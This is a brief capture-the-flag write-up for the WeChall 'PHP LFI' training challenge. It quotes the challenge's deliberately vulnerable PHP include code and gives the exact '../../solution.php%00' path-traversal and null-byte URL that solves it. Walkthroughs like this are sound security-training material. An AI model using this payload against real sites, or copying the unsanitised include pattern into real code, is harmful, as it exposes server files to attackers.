## Welcome to wechall writeup Pages


```markdown
write up for Training: PHP LFI (Exploit, PHP, Training)

# visit http://www.wechall.net/challenge/training/php/lfi/up/index.php
# Your mission is to exploit this code, which has obviously an LFI vulnerability
# view source of index.php with visit http://www.wechall.net/challenge/training/php/lfi/up/index.php?highlight=christmas
# the following code is vulnerability:

`
###############################
### Here is your exploit :) ###
###############################
$code = '$filename = \'pages/\'.(isset($_GET["file"])?$_GET["file"]:"welcome").\'.html\';';
$code_emulate_pnb = '$filename = Common::substrUntil($filename, "\\0");'; # Emulate Poison Null Byte for PHP>=5.3.4
$code2 = 'include $filename;';
### End of exploit ###
`

#so we need '../../' and '%00' to exploit like:

https://www.wechall.net/challenge/training/php/lfi/up/index.php?file=../../solution.php%00

# you will pass the challenge

```

